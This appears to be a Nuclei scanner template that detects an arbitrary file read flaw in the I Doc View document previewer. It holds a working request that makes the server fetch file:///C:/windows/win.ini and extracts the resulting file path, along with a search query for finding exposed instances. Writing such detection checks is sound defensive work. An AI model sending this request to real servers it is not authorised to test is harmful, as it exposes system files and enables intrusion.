http:
- extractors:
  - group: 1
    internal: true
    name: filepath
    part: body
    regex:
    - '"srcUrl":"\/([a-z/0-9_.]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, 'application/json')
    - contains_all(body, "ext", "srcUrl", "success", "md5")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt'
id: idocview-lfi
info:
  author: DhiyaneshDK
  metadata:
    fofa-query: "title==\"\u5728\u7EBF\u6587\u6863\u9884\u89C8 - I Doc View\""
    max-request: 1
    verified: true
  name: IDoc View - Arbitrary File Read
  severity: high
  tags: idoc,lfi,file-read
variables:
  file: '{{to_lower(rand_text_alpha(5))}}'
